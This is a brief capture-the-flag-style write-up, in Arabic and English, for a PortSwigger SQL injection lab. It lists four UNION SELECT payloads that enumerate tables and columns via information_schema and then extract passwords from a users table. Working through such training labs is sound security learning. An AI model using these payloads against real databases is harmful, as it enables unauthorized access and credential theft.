# Lab: SQL injection UNION attack, retrieving data from other tables

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

- الفكره من الLab ده انك تعرف تستخرج الdatabase والtable and column وتاخد البيانات بتاع الadmin

```bash
1. 'union select null,table_name from information_schema.tables-- - ==> tablesاظهار كل

2. 'union select null,column_name from information_schema.columns-- - ==> columnsاظهار كل 

3.'union select null,table_name from information_schema.columns where column_name='password'-- -  ==> المحدد columnالخاص بالtableمعرفه

4. 'union select null,password from users-- -  ==> table and columnاظهار المحتوي في 
```
